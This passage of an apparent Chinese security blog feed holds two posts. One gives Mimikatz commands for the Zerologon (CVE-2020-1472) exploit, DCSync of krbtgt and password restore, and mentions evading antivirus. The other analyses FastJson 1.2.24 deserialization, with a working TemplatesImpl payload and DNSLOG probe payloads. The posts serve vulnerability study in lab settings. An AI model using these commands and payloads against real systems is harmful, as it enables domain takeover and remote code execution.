href="https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&amp;mid=2247487380&amp;idx=2&amp;sn=2723d6d6eca3b3b1460dbe7bedb860ca&amp;chksm=eafa47d8dd8dcece7b0b01c331f750da994e7c6483e9839e2752ea830b59c72c72c9ea031e68&amp;mpshare=1&amp;scene=1&amp;srcid=0915K0mh2x5HCSuWhim4a8lF&amp;sharer_sharetime=1600248655858&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=3f730bd43b5106bfcfc536175a58a4f9591d1b260793c8320f040377f9e45b3f7b1781c4506ae0c3fc8415c1b2f8d9435f1fded377146fc29d269caa557b9830bdeeb81c8686131660911572d1ada5ea854d9300322be78d605613b9f1bd019df785e35a2a1741b74c3f37802d1c6fd84fd1b01daa33a9697d6a2b667626c94c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090529&amp;lang=zh_CN&amp;exportkey=Ay8gAj7ggbwWBs6jC8EQrCI%3D&amp;pass_ticket=31feuN9eshIctUXUsMy%2Fwuj0mP%2BK04tjRZZR3Gpdd1gV5CwB6kJIS0W2DnYDEWGx&amp;wx_header=0" title="Netlogon 特权提升漏洞-CVE-2020-1472-原理分析与验证" target="_blank" rel="noopener">Netlogon 特权提升漏洞(CVE-2020-1472)原理分析与验证</a></p><p>看不懂，那咋办啊~</p><h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><p><img src="/2020/09/16/CVE-2020-1472/8.png" alt><br>上午看见发布了部分代码，下午就更新了，不给过mimikatz太敏感，后续还得想想免杀叭</p><p><img src="/2020/09/16/CVE-2020-1472/mimikatz.gif" alt></p><p>更新一下部分Mimikatz命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mimikatz zerologon域：hacke.testlab</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:HACKE.testlab /dc:dc.hacke.testlab /user:krbtgt /authuser:dc$ /authdomain:HACKE /authpassword:&quot;&quot; /authntlm #空密码尝试</span><br><span class="line"></span><br><span class="line">privilge::debug #权限提升</span><br><span class="line"></span><br><span class="line">lsadump::zerologon /target:dc.hacke.testlab /account:dc$ #这个是poc</span><br><span class="line"></span><br><span class="line">lsadump::zerologon /target:dc.hacke.testlab /account:dc$ /exploit  #这个是exp</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:HACKE.LOCAL /dc:dc.hacke.testlab /user:krbtgt /authuser:dc$ /authdomain:HACKE /authpassword:&quot;&quot; /authntlm #再次空密码尝试</span><br><span class="line"></span><br><span class="line">lsadump::postzerologon /target:192.168.43.100 /account:dc$ #恢复密码</span><br></pre></td></tr></table></figure></p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a><br><a href="https://github.com/DimopoulosElias/SimpleMimikatzObfuscator" target="_blank" rel="noopener">https://github.com/DimopoulosElias/SimpleMimikatzObfuscator</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2020年9月16日 星期二  阴&lt;/p&gt;
&lt;p&gt;深夜难眠，回想起今天waf上一大堆误报和寥寥无几的告警，甲方爸爸提供的两荤一素已经换成了白粥榨菜，农夫已经换成了怡宝，猪肉换成了榨菜，或许我们是时长一个月实习生的身份，已经彻底暴露了，明天不知道是不是只能吃开水泡面了。唉，明
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>FastJson&lt;1.2.24反序列化漏洞分析</title>
    <link href="http://sherlocz.github.io/2020/08/27/FastJson-1-2-24/"/>
    <id>http://sherlocz.github.io/2020/08/27/FastJson-1-2-24/</id>
    <published>2020-08-27T05:39:11.000Z</published>
    <updated>2020-08-30T06:00:17.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h1><p>FastJson为阿里巴巴维护的一个json库，被称为JAVA中最快的Json库，它能将我们的对象序列化成Json，也可以将我们恶意的Json反序列化为恶意对象，从而执行命令。</p><h1 id="FastJson的序列化与反序列化"><a href="#FastJson的序列化与反序列化" class="headerlink" title="FastJson的序列化与反序列化"></a>FastJson的序列化与反序列化</h1><p>新建maven项目，修改pom.xml：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.2.23&lt;/version&gt;&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>首先我们创建一个我们需要序列化的对象，对象属性为私有，设置好set/get方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"></span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    @JSONField(name = &quot;AGE&quot;)</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    @JSONField(name = &quot;FULL NAME&quot;)</span><br><span class="line">    private String fullName;</span><br><span class="line"></span><br><span class="line">    @JSONField(name = &quot;DATE OF BIRTH&quot;)</span><br><span class="line">    private Date dateOfBirth;</span><br><span class="line"></span><br><span class="line">    public Person(int age, String fullName, Date dateOfBirth) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.age = age;</span><br><span class="line">        this.fullName= fullName;</span><br><span class="line">        this.dateOfBirth = dateOfBirth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getFullName() &#123;</span><br><span class="line">        return fullName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setFullName(String fullName) &#123;</span><br><span class="line">        this.fullName = fullName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接下来我们用FastJson来序列化对象，利用其内置的toJSONString方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.io.PipedWriter;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class fastjsonTestDemo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Person John = new Person(15, &quot;John Doe&quot;, new Date());</span><br><span class="line">        //序列化</span><br><span class="line">        String jsonOutput= JSON.toJSONString(John);</span><br><span class="line">        System.out.println(jsonOutput);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;AGE&quot;:15,&quot;DATE OF BIRTH&quot;:1598507249938,&quot;FULL NAME&quot;:&quot;John Doe&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>我们也可以将上述的JSON格式反序列化为对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//反序列化</span><br><span class="line">Object obj1 = JSON.parseObject(jsonOutput);</span><br><span class="line">System.out.println(obj1);</span><br><span class="line">System.out.println(obj1.getClass().getName());</span><br></pre></td></tr></table></figure></p><p>输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;DATE OF BIRTH&quot;:1598507249938,&quot;FULL NAME&quot;:&quot;John Doe&quot;,&quot;AGE&quot;:15&#125;</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure></p><p>同时我们可以通过FastJson的@type指定我们需要反序列化的类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line">public class fastjsonTestDemo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String myJSON = &quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;,\&quot;AGE\&quot;:15,\&quot;dateOfBirth\&quot;:1598336520384,\&quot;fullName\&quot;:\&quot;sher10ck\&quot;&#125;&quot;;</span><br><span class="line">        JSONObject Ps = JSON.parseObject(myJSON);</span><br><span class="line">        System.out.println(Ps);</span><br><span class="line">        System.out.println(&quot;result =&gt; &quot; + Ps.get(&quot;fullName&quot;));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Person&quot;,&quot;fullName&quot;:&quot;John Doe&quot;,&quot;dateOfBirth&quot;:1598336520384,&quot;AGE&quot;:15&#125;</span><br><span class="line">result =&gt; sher10ck</span><br></pre></td></tr></table></figure></p><p>下一步就是想办法传入我们的恶意Json</p><p>搭建环境war包：<br><a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war" target="_blank" rel="noopener">https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war</a></p><h1 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h1><p>弹出计算器payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTHBlcnNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAHAAgHACcMACgAKQEABGNhbGMMACoAKwEAC3BlcnNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADwAEABAADQARAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAFQALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAAAAAQAWABcAAwABABAAGAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAGgALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABkAGgACAA4AAAAEAAEAGwABABwAAAACAB0=&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>运行效果：<br><img src="/2020/08/27/FastJson-1-2-24/calc.png" alt></p><h1 id="DNSLOG检测"><a href="#DNSLOG检测" class="headerlink" title="DNSLOG检测"></a>DNSLOG检测</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_45714179/article/details/103237473" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45714179/article/details/103237473</a></p><p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></p><p><a href="https://yoga7xm.top/2019/07/20/fastjson/" target="_blank" rel="noopener">https://yoga7xm.top/2019/07/20/fastjson/</a></p><p><a href="https://www.freebuf.com/news/232758.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232758.html</a></p><p><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p><p><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;FastJson&quot;&gt;&lt;a href=&quot;#FastJson&quot; class=&quot;headerlink&quot; title=&quot;FastJson&quot;&gt;&lt;/a&gt;FastJson&lt;/h1&gt;&lt;p&gt;FastJson为阿里巴巴维护的一个json库，被称为JAVA中最快的Json库，它能将我们
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
</feed>
